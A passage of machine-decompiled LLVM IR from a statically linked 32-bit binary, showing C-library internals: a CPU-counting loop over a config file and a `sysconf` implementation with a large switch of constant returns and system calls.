  store i32 %v15_805300f, i32* @edi, align 4
  %v5_805306819 = inttoptr i32 %v1_805301e to i32*
  %v6_805306820 = call i32 @__GI_config_read(i32* %v5_805306819, i32 %v15_805300f, i32 258, i32 ptrtoint (i32* @global_var_80558fc.14 to i32))
  %v1_805307021 = icmp eq i32 %v6_805306820, 0
  %v1_805307222 = icmp eq i1 %v1_805307021, false
  br i1 %v1_805307222, label %dec_label_pc_8053030, label %dec_label_pc_80530bc

dec_label_pc_8053030:                             ; preds = %dec_label_pc_805302a, %dec_label_pc_805305c.backedge
  %v2_8053030 = load i32, i32* %stack_var_-16, align 4
  %v1_8053033 = inttoptr i32 %v2_8053030 to i32*
  %v2_8053033 = load i32, i32* %v1_8053033, align 4
  %v1_8053035 = inttoptr i32 %v2_8053033 to i8*
  %v2_8053035 = load i8, i8* %v1_8053035, align 1
  %v11_8053035 = icmp eq i8 %v2_8053035, 99
  %v1_8053038 = icmp eq i1 %v11_8053035, false
  br i1 %v1_8053038, label %dec_label_pc_805305c.backedge, label %dec_label_pc_805303a

dec_label_pc_805303a:                             ; preds = %dec_label_pc_8053030
  %v1_805303a = add i32 %v2_8053033, 1
  %v2_805303a = inttoptr i32 %v1_805303a to i8*
  %v3_805303a = load i8, i8* %v2_805303a, align 1
  %v9_805303a = icmp eq i8 %v3_805303a, 112
  %v1_805303e = icmp eq i1 %v9_805303a, false
  br i1 %v1_805303e, label %dec_label_pc_805305c.backedge, label %dec_label_pc_8053040

dec_label_pc_8053040:                             ; preds = %dec_label_pc_805303a
  %v1_8053040 = add i32 %v2_8053033, 2
  %v2_8053040 = inttoptr i32 %v1_8053040 to i8*
  %v3_8053040 = load i8, i8* %v2_8053040, align 1
  %v12_8053040 = icmp eq i8 %v3_8053040, 117
  %v1_8053044 = icmp eq i1 %v12_8053040, false
  br i1 %v1_8053044, label %dec_label_pc_805305c.backedge, label %dec_label_pc_8053046

dec_label_pc_8053046:                             ; preds = %dec_label_pc_8053040
  %v1_8053046 = add i32 %v2_8053033, 3
  %v2_8053046 = inttoptr i32 %v1_8053046 to i8*
  %v3_8053046 = load i8, i8* %v2_8053046, align 1
  %v4_8053046 = zext i8 %v3_8053046 to i32
  %v0_805304a = load i32, i32* inttoptr (i32 134577152 to i32*), align 1024
  %v2_805304f = mul nuw nsw i32 %v4_8053046, 2
  %v3_805304f = add i32 %v2_805304f, %v0_805304a
  %v4_805304f = inttoptr i32 %v3_805304f to i16*
  %v5_805304f = load i16, i16* %v4_805304f, align 2
  %v1_8053053 = and i16 %v5_805304f, 8
  %v2_8053053 = icmp eq i16 %v1_8053053, 0
  %v0_8053059 = load i32, i32* @ebx, align 4
  %v2_8053059 = zext i1 %v2_8053053 to i32
  %v3_8053059 = add i32 %v0_8053059, 1
  %v4_8053059 = add i32 %v3_8053059, %v2_8053059
  store i32 %v4_8053059, i32* @ebx, align 4
  br label %dec_label_pc_805305c.backedge

dec_label_pc_805305c.backedge:                    ; preds = %dec_label_pc_8053046, %dec_label_pc_8053030, %dec_label_pc_805303a, %dec_label_pc_8053040
  %v0_8053067.pre = load i32, i32* @esi, align 4
  %v5_8053068 = inttoptr i32 %v0_8053067.pre to i32*
  %v6_8053068 = call i32 @__GI_config_read(i32* %v5_8053068, i32 %v15_805300f, i32 258, i32 ptrtoint (i32* @global_var_80558fc.14 to i32))
  %v1_8053070 = icmp eq i32 %v6_8053068, 0
  %v1_8053072 = icmp eq i1 %v1_8053070, false
  br i1 %v1_8053072, label %dec_label_pc_8053030, label %dec_label_pc_80530bc

dec_label_pc_8053076:                             ; preds = %entry
  %v1_805307b = call i32 @__GI_config_open(i32 ptrtoint ([14 x i8]* @global_var_8055f1b.311 to i32))
  store i32 %v1_805307b, i32* @esi, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %v15_805300f, i32* @edi, align 4
  %v1_8053087 = icmp eq i32 %v1_805307b, 0
  %v1_8053089 = icmp eq i1 %v1_8053087, false
  br i1 %v1_8053089, label %dec_label_pc_80530a4.preheader, label %dec_label_pc_80530bc

dec_label_pc_80530a4.preheader:                   ; preds = %dec_label_pc_8053076
  %v5_80530b015 = inttoptr i32 %v1_805307b to i32*
  %v6_80530b016 = call i32 @__GI_config_read(i32* %v5_80530b015, i32 %v15_805300f, i32 459266, i32 ptrtoint (i32* @global_var_8055f4c.313 to i32))
  %v1_80530b817 = icmp eq i32 %v6_80530b016, 0
  %v1_80530ba18 = icmp eq i1 %v1_80530b817, false
  br i1 %v1_80530ba18, label %dec_label_pc_805308d, label %dec_label_pc_80530bc

dec_label_pc_805308d:                             ; preds = %dec_label_pc_80530a4.preheader, %dec_label_pc_805308d
  %v2_805308d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805308d, i32* @eax, align 4
  %v1_8053090 = inttoptr i32 %v2_805308d to i32*
  %v2_8053090 = load i32, i32* %v1_8053090, align 4
  %v4_8053097 = call i32 @__GI_strcoll(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8055f29.312, i32 0, i32 0), i32 %v2_8053090)
  %v5_805309c = icmp eq i32 %v4_8053097, 0
  %v0_80530a0 = load i32, i32* @ebx, align 4
  %v2_80530a0 = zext i1 %v5_805309c to i32
  %v3_80530a0 = add i32 %v0_80530a0, %v2_80530a0
  store i32 %v3_80530a0, i32* @ebx, align 4
  %v0_80530af.pre = load i32, i32* @esi, align 4
  %v5_80530b0 = inttoptr i32 %v0_80530af.pre to i32*
  %v6_80530b0 = call i32 @__GI_config_read(i32* %v5_80530b0, i32 %v15_805300f, i32 459266, i32 ptrtoint (i32* @global_var_8055f4c.313 to i32))
  %v1_80530b8 = icmp eq i32 %v6_80530b0, 0
  %v1_80530ba = icmp eq i1 %v1_80530b8, false
  br i1 %v1_80530ba, label %dec_label_pc_805308d, label %dec_label_pc_80530bc

dec_label_pc_80530bc:                             ; preds = %dec_label_pc_805302a, %dec_label_pc_805305c.backedge, %dec_label_pc_80530a4.preheader, %dec_label_pc_805308d, %dec_label_pc_8053076
  %v0_80530bc = load i32, i32* @esi, align 4
  %v1_80530bd = inttoptr i32 %v0_80530bc to i32*
  %v2_80530bd = call i32 @__GI_config_close(i32* %v1_80530bd)
  %v0_80530c3 = load i32, i32* @ebx, align 4
  %v1_80530c3 = icmp eq i32 %v0_80530c3, 0
  %v1_80530c5 = icmp eq i1 %v1_80530c3, false
  br i1 %v1_80530c5, label %dec_label_pc_80530c9, label %dec_label_pc_80530c7

dec_label_pc_80530c7:                             ; preds = %dec_label_pc_80530bc
  %v1_80530c7 = and i32 %v0_80530c3, -256
  %v2_80530c7 = or i32 %v1_80530c7, 1
  br label %dec_label_pc_80530c9

dec_label_pc_80530c9:                             ; preds = %dec_label_pc_80530bc, %dec_label_pc_80530c7
  %v0_80530c9 = phi i32 [ %v0_80530c3, %dec_label_pc_80530bc ], [ %v2_80530c7, %dec_label_pc_80530c7 ]
  ret i32 %v0_80530c9

; uselistorder directives
  uselistorder i32 %v15_805300f, { 2, 1, 5, 3, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_8055f4c.313 to i32), { 1, 0 }
  uselistorder i32 459266, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 1, 3, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80558fc.14 to i32), { 1, 0, 2, 3 }
  uselistorder i32 258, { 1, 0 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_80530c9, { 1, 0 }
  uselistorder label %dec_label_pc_80530bc, { 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_805308d, { 1, 0 }
  uselistorder label %dec_label_pc_805305c.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8053030, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_80530d0 = load i32, i32* @esi, align 4
  %v0_80530d1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  switch i32 %arg1, label %dec_label_pc_80530f1 [
    i32 0, label %dec_label_pc_8053105
    i32 1, label %dec_label_pc_80530fd
    i32 2, label %dec_label_pc_8053139
    i32 3, label %dec_label_pc_8053143
    i32 4, label %dec_label_pc_805314d
    i32 5, label %dec_label_pc_8053281
    i32 6, label %dec_label_pc_8053157
    i32 7, label %dec_label_pc_80530e7
    i32 8, label %dec_label_pc_80530e7
    i32 9, label %dec_label_pc_80530e7
    i32 10, label %dec_label_pc_80530e7
    i32 11, label %dec_label_pc_80530e7
    i32 12, label %dec_label_pc_80530e7
    i32 13, label %dec_label_pc_80530e7
    i32 14, label %dec_label_pc_80530e7
    i32 15, label %dec_label_pc_80530e7
    i32 16, label %dec_label_pc_80530e7
    i32 17, label %dec_label_pc_80530e7
    i32 18, label %dec_label_pc_80530e7
    i32 19, label %dec_label_pc_80530e7
    i32 20, label %dec_label_pc_80530e7
    i32 21, label %dec_label_pc_80530e7
    i32 22, label %dec_label_pc_80530e7
    i32 23, label %dec_label_pc_80530fd
    i32 24, label %dec_label_pc_80530fd
    i32 25, label %dec_label_pc_80532b9
    i32 26, label %dec_label_pc_80532b2
    i32 27, label %dec_label_pc_80530fd
    i32 28, label %dec_label_pc_805316b
    i32 29, label %dec_label_pc_805328f
    i32 30, label %dec_label_pc_8053161
    i32 31, label %dec_label_pc_805329d
    i32 32, label %dec_label_pc_80530fd
    i32 33, label %dec_label_pc_80532b2
    i32 34, label %dec_label_pc_80530fd
    i32 35, label %dec_label_pc_80530fd
    i32 36, label %dec_label_pc_80532c0
    i32 37, label %dec_label_pc_80532c7
    i32 38, label %dec_label_pc_80532c0
    i32 39, label %dec_label_pc_8053175
    i32 40, label %dec_label_pc_8053288
    i32 41, label %dec_label_pc_80530fd
    i32 42, label %dec_label_pc_805329d
    i32 43, label %dec_label_pc_80532c7
    i32 44, label %dec_label_pc_80532ce
    i32 45, label %dec_label_pc_80532c7
    i32 46, label %dec_label_pc_805328f
    i32 47, label %dec_label_pc_805328f
    i32 48, label %dec_label_pc_805328f
    i32 49, label %dec_label_pc_80530fd
    i32 50, label %dec_label_pc_80530fd
    i32 51, label %dec_label_pc_805328f
    i32 52, label %dec_label_pc_80530fd
    i32 53, label %dec_label_pc_80530fd
    i32 54, label %dec_label_pc_80530fd
    i32 55, label %dec_label_pc_80530fd
    i32 56, label %dec_label_pc_80530fd
    i32 57, label %dec_label_pc_80530fd
    i32 58, label %dec_label_pc_80530fd
    i32 59, label %dec_label_pc_80530fd
    i32 60, label %dec_label_pc_80532ab
    i32 61, label %dec_label_pc_80530fd
    i32 62, label %dec_label_pc_80530fd
    i32 63, label %dec_label_pc_80530fd
    i32 64, label %dec_label_pc_80530fd
    i32 65, label %dec_label_pc_80530fd
    i32 66, label %dec_label_pc_80530fd
    i32 67, label %dec_label_pc_80530e7
    i32 68, label %dec_label_pc_80530e7
    i32 69, label %dec_label_pc_8053296
    i32 70, label %dec_label_pc_8053296
    i32 71, label %dec_label_pc_8053296
    i32 72, label %dec_label_pc_805329d
    i32 73, label %dec_label_pc_80532a4
    i32 74, label %dec_label_pc_80532ab
    i32 75, label %dec_label_pc_8053189
    i32 76, label %dec_label_pc_80530fd
    i32 77, label %dec_label_pc_80530e7
    i32 78, label %dec_label_pc_80530e7
    i32 79, label %dec_label_pc_80530e7
    i32 80, label %dec_label_pc_80530e7
    i32 81, label %dec_label_pc_80530e7
    i32 82, label %dec_label_pc_80530e7
    i32 83, label %dec_label_pc_8053193
    i32 84, label %dec_label_pc_80531f8
    i32 85, label %dec_label_pc_80530fd
    i32 86, label %dec_label_pc_80530fd
    i32 87, label %dec_label_pc_80532b2
    i32 88, label %dec_label_pc_8053204
    i32 89, label %dec_label_pc_805320e
    i32 90, label %dec_label_pc_80532a4
    i32 91, label %dec_label_pc_80530e7
    i32 92, label %dec_label_pc_80530e7
    i32 93, label %dec_label_pc_80530e7
    i32 94, label %dec_label_pc_80530e7
    i32 95, label %dec_label_pc_805317f
    i32 96, label %dec_label_pc_80530fd
    i32 97, label %dec_label_pc_80530fd
    i32 98, label %dec_label_pc_80530e7
    i32 99, label %dec_label_pc_80530e7
    i32 100, label %dec_label_pc_80530e7
    i32 101, label %dec_label_pc_8053218
    i32 102, label %dec_label_pc_8053288
    i32 103, label %dec_label_pc_8053222
    i32 104, label %dec_label_pc_80532b2
    i32 105, label %dec_label_pc_8053229
    i32 106, label %dec_label_pc_805329d
    i32 107, label %dec_label_pc_805329d
    i32 108, label %dec_label_pc_8053281
    i32 109, label %dec_label_pc_80532b9
    i32 110, label %dec_label_pc_80532ce
    i32 111, label %dec_label_pc_8053233
    i32 112, label %dec_label_pc_805323d
    i32 113, label %dec_label_pc_80532ce
    i32 114, label %dec_label_pc_8053247
    i32 115, label %dec_label_pc_8053288
    i32 116, label %dec_label_pc_80530fd
    i32 117, label %dec_label_pc_80530fd
    i32 118, label %dec_label_pc_8053251
    i32 119, label %dec_label_pc_8053258
    i32 120, label %dec_label_pc_80532c7
    i32 121, label %dec_label_pc_80532b2
    i32 122, label %dec_label_pc_80532b2
    i32 123, label %dec_label_pc_80532b2
    i32 124, label %dec_label_pc_80532b2
    i32 125, label %dec_label_pc_80530e7
    i32 126, label %dec_label_pc_80530e7
    i32 127, label %dec_label_pc_80530fd
    i32 128, label %dec_label_pc_80530fd
    i32 129, label %dec_label_pc_80530e7
    i32 130, label %dec_label_pc_80530e7
    i32 131, label %dec_label_pc_80530e7
    i32 139, label %dec_label_pc_80530fd
    i32 149, label %dec_label_pc_805325f
    i32 237, label %dec_label_pc_80530e7
    i32 238, label %dec_label_pc_80530e7
    i32 239, label %dec_label_pc_80530fd
    i32 240, label %dec_label_pc_80530fd
  ]

dec_label_pc_80530e7:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80532d3

dec_label_pc_80530f1:                             ; preds = %entry
  store i32 22, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_80530fd

dec_label_pc_80530fd:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_80530f1
  br label %dec_label_pc_80532d3

dec_label_pc_8053105:                             ; preds = %entry
  %v2_8053105 = ptrtoint i32* %stack_var_-16 to i32
  %v3_805310c = call i32 @getrlimit(i32 3, i32 %v2_8053105)
  %v1_8053118 = icmp eq i32 %v3_805310c, 0
  %v1_805311a = icmp eq i1 %v1_8053118, false
  br i1 %v1_805311a, label %dec_label_pc_80532d3, label %dec_label_pc_8053120

dec_label_pc_8053120:                             ; preds = %dec_label_pc_8053105
  %v3_8053120 = load i32, i32* %stack_var_-16, align 4
  %tmp27 = icmp ult i32 %v3_8053120, 524288
  br i1 %tmp27, label %dec_label_pc_80532d3, label %dec_label_pc_805312f

dec_label_pc_805312f:                             ; preds = %dec_label_pc_8053120
  %v2_8053131 = udiv i32 %v3_8053120, 4
  br label %dec_label_pc_80532d3

dec_label_pc_8053139:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_8053143:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_805314d:                             ; preds = %entry
  %v2_805314d = call i32 @getdtablesize(i32 %v0_80530d1, i32 %v0_80530d0)
  br label %dec_label_pc_80531fd

dec_label_pc_8053157:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_8053161:                             ; preds = %entry
  %v2_8053161 = call i32 @__GI_getpagesize(i32 %v0_80530d1, i32 %v0_80530d0)
  br label %dec_label_pc_80531fd

dec_label_pc_805316b:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_8053175:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_805317f:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_8053189:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_8053193:                             ; preds = %entry
  %v3_8053198 = call i32 @__GI_opendir(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_8055f33.315, i32 0, i32 0))
  store i32 %v3_8053198, i32* @eax, align 4
  store i32 0, i32* @esi, align 4
  store i32 %v3_8053198, i32* @ebx, align 4
  %v1_80531a2 = icmp eq i32 %v3_8053198, 0
  %v1_80531a4 = icmp eq i1 %v1_80531a2, false
  br i1 %v1_80531a4, label %dec_label_pc_80531ce.preheader, label %dec_label_pc_80531e2

dec_label_pc_80531ce.preheader:                   ; preds = %dec_label_pc_8053193
  %tmp1620 = inttoptr i32 %v3_8053198 to i32*
  %v3_80531cf21 = call i32 @readdir64(i32* %tmp1620)
  %v1_80531d524 = icmp eq i32 %v3_80531cf21, 0
  %v1_80531d725 = icmp eq i1 %v1_80531d524, false
  br i1 %v1_80531d725, label %dec_label_pc_80531a8, label %dec_label_pc_80531d9

dec_label_pc_80531a8:                             ; preds = %dec_label_pc_80531ce.preheader, %dec_label_pc_80531ce.backedge
  %v3_80531cf26 = phi i32 [ %v3_80531cf, %dec_label_pc_80531ce.backedge ], [ %v3_80531cf21, %dec_label_pc_80531ce.preheader ]
  %v1_80531a8 = add i32 %v3_80531cf26, 18
  %v2_80531a8 = inttoptr i32 %v1_80531a8 to i16*
  %v3_80531a8 = load i16, i16* %v2_80531a8, align 2
  %v12_80531a8 = icmp eq i16 %v3_80531a8, 25348
  %v1_80531ae = icmp eq i1 %v12_80531a8, false
  br i1 %v1_80531ae, label %dec_label_pc_80531ce.backedge, label %dec_label_pc_80531b0

dec_label_pc_80531b0:                             ; preds = %dec_label_pc_80531a8
  %v1_80531b0 = add i32 %v3_80531cf26, 20
  %v2_80531b0 = inttoptr i32 %v1_80531b0 to i16*
  %v3_80531b0 = load i16, i16* %v2_80531b0, align 2
  %v9_80531b0 = icmp eq i16 %v3_80531b0, 30064
  %v1_80531b6 = icmp eq i1 %v9_80531b0, false
  br i1 %v1_80531b6, label %dec_label_pc_80531ce.backedge, label %dec_label_pc_80531b8

dec_label_pc_80531b8:                             ; preds = %dec_label_pc_80531b0
  %v1_80531b8 = add i32 %v3_80531cf26, 22
  %v2_80531b8 = inttoptr i32 %v1_80531b8 to i8*
  %v3_80531b8 = load i8, i8* %v2_80531b8, align 1
  %v4_80531b8 = zext i8 %v3_80531b8 to i32
  %v0_80531bc = load i32, i32* @global_var_8057c00, align 1024
  %v2_80531c1 = mul nuw nsw i32 %v4_80531b8, 2
  %v3_80531c1 = add i32 %v2_80531c1, %v0_80531bc
  %v4_80531c1 = inttoptr i32 %v3_80531c1 to i16*
  %v5_80531c1 = load i16, i16* %v4_80531c1, align 2
  %v1_80531c5 = and i16 %v5_80531c1, 8
  %v2_80531c5 = icmp eq i16 %v1_80531c5, 0
  %v0_80531cb = load i32, i32* @esi, align 4
  %v2_80531cb = zext i1 %v2_80531c5 to i32
  %v3_80531cb = add i32 %v0_80531cb, 1
  %v4_80531cb = add i32 %v3_80531cb, %v2_80531cb
  store i32 %v4_80531cb, i32* @esi, align 4
  br label %dec_label_pc_80531ce.backedge

dec_label_pc_80531ce.backedge:                    ; preds = %dec_label_pc_80531b8, %dec_label_pc_80531a8, %dec_label_pc_80531b0
  %v0_80531ce.pre = load i32, i32* @ebx, align 4
  %tmp16 = inttoptr i32 %v0_80531ce.pre to i32*
  %v3_80531cf = call i32 @readdir64(i32* %tmp16)
  %v1_80531d5 = icmp eq i32 %v3_80531cf, 0
  %v1_80531d7 = icmp eq i1 %v1_80531d5, false
  br i1 %v1_80531d7, label %dec_label_pc_80531a8, label %dec_label_pc_80531d9

dec_label_pc_80531d9:                             ; preds = %dec_label_pc_80531ce.backedge, %dec_label_pc_80531ce.preheader
  %v0_80531d9 = load i32, i32* @ebx, align 4
  %tmp17 = inttoptr i32 %v0_80531d9 to i32*
  %v3_80531da = call i32 @__GI_closedir(i32* %tmp17)
  %v0_80531e9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80531e9

dec_label_pc_80531e2:                             ; preds = %dec_label_pc_8053193
  %v2_80531e2 = load i32, i32* %stack_var_-24, align 4
  %v3_80531e2 = call i32 @nprocessors_onln(i32 ptrtoint ([24 x i8]* @global_var_8055f33.315 to i32), i32 %v2_80531e2)
  br label %dec_label_pc_80531e9

dec_label_pc_80531e9:                             ; preds = %dec_label_pc_80531d9, %dec_label_pc_80531e2
  %v0_80531ed = phi i32 [ %v0_80531e9.pre, %dec_label_pc_80531d9 ], [ %v3_80531e2, %dec_label_pc_80531e2 ]
  %v1_80531e9 = icmp eq i32 %v0_80531ed, 0
  %v1_80531eb = icmp eq i1 %v1_80531e9, false
  br i1 %v1_80531eb, label %dec_label_pc_80531f1, label %dec_label_pc_80531ed

dec_label_pc_80531ed:                             ; preds = %dec_label_pc_80531e9
  %v1_80531ed = and i32 %v0_80531ed, -65536
  %v2_80531ed = or i32 %v1_80531ed, 1
  br label %dec_label_pc_80531f1

dec_label_pc_80531f1:                             ; preds = %dec_label_pc_80531e9, %dec_label_pc_80531ed
  %v0_80531f1 = phi i32 [ %v0_80531ed, %dec_label_pc_80531e9 ], [ %v2_80531ed, %dec_label_pc_80531ed ]
  br label %dec_label_pc_80532d3

dec_label_pc_80531f8:                             ; preds = %entry
  %v2_80531f8 = call i32 @nprocessors_onln(i32 %v0_80530d1, i32 %v0_80530d0)
  br label %dec_label_pc_80531fd

dec_label_pc_80531fd:                             ; preds = %dec_label_pc_8053161, %dec_label_pc_805314d, %dec_label_pc_80531f8
  %v0_80531fd = phi i32 [ %v2_8053161, %dec_label_pc_8053161 ], [ %v2_805314d, %dec_label_pc_805314d ], [ %v2_80531f8, %dec_label_pc_80531f8 ]
  br label %dec_label_pc_80532d3

dec_label_pc_8053204:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_805320e:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_8053218:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_8053222:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_8053229:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_8053233:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_805323d:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_8053247:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_8053251:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_8053258:                             ; preds = %entry
  br label %dec_label_pc_80532d3

dec_label_pc_805325f:                             ; preds = %entry
  %tmp18 = bitcast i32* %stack_var_-24 to %timespec*
  %v4_805326d = call i32 @clock_getres(i32 1, %timespec* %tmp18)
  %not.v1_8053276 = icmp ugt i32 %v4_805326d, -4096
  %v1_805327e = sext i1 %not.v1_8053276 to i32
  br label %dec_label_pc_80532d3

dec_label_pc_8053281:                             ; preds = %entry, %entry
  br label %dec_label_pc_80532d3

dec_label_pc_8053288:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_80532d3

dec_label_pc_805328f:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80532d3

dec_label_pc_8053296:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_80532d3

dec_label_pc_805329d:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80532d3

dec_label_pc_80532a4:                             ; preds = %entry, %entry
  br label %dec_label_pc_80532d3

dec_label_pc_80532ab:                             ; preds = %entry, %entry
  br label %dec_label_pc_80532d3

dec_label_pc_80532b2:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80532d3

dec_label_pc_80532b9:                             ; preds = %entry, %entry
  br label %dec_label_pc_80532d3

dec_label_pc_80532c0:                             ; preds = %entry, %entry
  br label %dec_label_pc_80532d3

dec_label_pc_80532c7:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_80532d3

dec_label_pc_80532ce:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_80532d3

dec_label_pc_80532d3:                             ; preds = %dec_label_pc_8053120, %dec_label_pc_8053105, %dec_label_pc_80532c7, %dec_label_pc_80532c0, %dec_label_pc_80532b9, %dec_label_pc_80532b2, %dec_label_pc_80532ab, %dec_label_pc_80532a4, %dec_label_pc_805329d, %dec_label_pc_8053296, %dec_label_pc_805328f, %dec_label_pc_8053288, %dec_label_pc_8053281, %dec_label_pc_805325f, %dec_label_pc_8053258, %dec_label_pc_8053251, %dec_label_pc_8053247, %dec_label_pc_805323d, %dec_label_pc_8053233, %dec_label_pc_8053229, %dec_label_pc_8053222, %dec_label_pc_8053218, %dec_label_pc_805320e, %dec_label_pc_8053204, %dec_label_pc_80531f1, %dec_label_pc_8053189, %dec_label_pc_805317f, %dec_label_pc_8053175, %dec_label_pc_805316b, %dec_label_pc_8053157, %dec_label_pc_80531fd, %dec_label_pc_8053143, %dec_label_pc_8053139, %dec_label_pc_805312f, %dec_label_pc_80530e7, %dec_label_pc_80530fd, %dec_label_pc_80532ce
  %v0_80532d6 = phi i32 [ 131072, %dec_label_pc_8053120 ], [ 131072, %dec_label_pc_8053105 ], [ 2048, %dec_label_pc_80532c7 ], [ 99, %dec_label_pc_80532c0 ], [ 20, %dec_label_pc_80532b9 ], [ 2147483647, %dec_label_pc_80532b2 ], [ 1024, %dec_label_pc_80532ab ], [ 4, %dec_label_pc_80532a4 ], [ 32, %dec_label_pc_805329d ], [ 256, %dec_label_pc_8053296 ], [ 200112, %dec_label_pc_805328f ], [ 255, %dec_label_pc_8053288 ], [ 16, %dec_label_pc_8053281 ], [ %v1_805327e, %dec_label_pc_805325f ], [ 9, %dec_label_pc_8053258 ], [ 65535, %dec_label_pc_8053251 ], [ -32768, %dec_label_pc_8053247 ], [ -128, %dec_label_pc_805323d ], [ 127, %dec_label_pc_8053233 ], [ -2147483648, %dec_label_pc_8053229 ], [ 0, %dec_label_pc_8053222 ], [ 8, %dec_label_pc_8053218 ], [ 500, %dec_label_pc_805320e ], [ 4096, %dec_label_pc_8053204 ], [ %v0_80531f1, %dec_label_pc_80531f1 ], [ 16384, %dec_label_pc_8053189 ], [ 200809, %dec_label_pc_805317f ], [ 1000, %dec_label_pc_8053175 ], [ 32768, %dec_label_pc_805316b ], [ 6, %dec_label_pc_8053157 ], [ %v0_80531fd, %dec_label_pc_80531fd ], [ 65536, %dec_label_pc_8053143 ], [ 100, %dec_label_pc_8053139 ], [ %v2_8053131, %dec_label_pc_805312f ], [ 1, %dec_label_pc_80530e7 ], [ -1, %dec_label_pc_80530fd ], [ 32767, %dec_label_pc_80532ce ]
  ret i32 %v0_80532d6

; uselistorder directives
  uselistorder i32 %v3_80531cf, { 1, 0 }
  uselistorder i32 %v3_80531cf26, { 0, 2, 1 }
  uselistorder i32 %v0_80530d1, { 2, 1, 0 }
  uselistorder i32 %v0_80530d0, { 2, 1, 0 }
  uselistorder i32 16384, { 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 1, 2, 3, 4, 5, 6, 36, 37, 7, 38, 39, 40, 41, 42 }
  uselistorder i32 2048, { 8, 2, 3, 0, 1, 4, 5, 9, 6, 7 }
  uselistorder i32 (i32, i32)* @nprocessors_onln, { 1, 0 }
  uselistorder i32 (i32*)* @__GI_closedir, { 0, 3, 1, 2 }
  uselistorder i32 (i32*)* @readdir64, { 1, 0 }
  uselistorder i32 524288, { 2, 0, 1 }
  uselistorder i32 149, { 1, 0 }
  uselistorder i32 127, { 1, 4, 3, 2, 0 }
  uselistorder i32 124, { 23, 0, 2, 3, 10, 11, 4, 12, 13, 14, 5, 6, 15, 16, 7, 17, 18, 8, 19, 20, 21, 22, 1, 9 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 115, { 4, 0, 2, 1, 3 }
  uselistorder i32 114, { 4, 0, 2, 1, 3 }
  uselistorder i32 112, { 9, 0, 8, 4, 2, 1, 10, 7, 11, 12, 5, 3, 6, 13, 14, 15, 16, 17 }
  uselistorder i32 110, { 2, 0, 1 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 100, { 0, 3, 1, 2, 4 }
  uselistorder i32 99, { 2, 3, 1, 0 }
  uselistorder i32 96, { 3, 5, 6, 0, 4, 7, 1, 8, 9, 2 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 87, { 1, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 83, { 2, 0, 1 }
  uselistorder i32 79, { 2, 0, 1 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 59, { 1, 0, 2, 3 }
  uselistorder i32 58, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 57, { 0, 4, 5, 1, 2, 3 }
  uselistorder i32 55, { 2, 0, 1, 6, 3, 4, 5 }
  uselistorder i32 54, { 0, 4, 1, 2, 3 }
  uselistorder i32 53, { 2, 0, 3, 1 }
  uselistorder i32 51, { 1, 2, 3, 4, 0 }
  uselistorder i32 50, { 1, 2, 0 }
  uselistorder i32 49, { 1, 2, 0 }
  uselistorder i32 46, { 1, 2, 3, 4, 0 }
